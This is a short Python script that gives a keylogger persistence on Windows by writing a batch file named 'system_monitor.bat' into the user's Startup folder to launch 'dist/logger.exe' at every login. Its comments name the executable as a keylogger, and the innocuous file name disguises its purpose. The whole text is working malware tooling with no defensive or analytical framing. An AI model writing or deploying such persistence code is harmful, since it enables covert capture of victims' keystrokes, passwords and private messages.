import os
import shutil
import getpass

def add_to_startup(file_path):
    """Copy the executable to the startup folder using a batch file shortcut."""
    username = getpass.getuser()
    startup_path = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    
    # Name for the startup batch file
    batch_file = "system_monitor.bat"
    shortcut_path = os.path.join(startup_path, batch_file)
    
    # Create a batch file that starts the keylogger executable
    with open(shortcut_path, 'w') as f:
        f.write(f'start "" "{file_path}"\n')
    
    print(f"[*] Added to startup: {shortcut_path}")

# Path to the compiled keylogger executable (adjust if needed)
exe_path = os.path.abspath("dist/logger.exe")
add_to_startup(exe_path)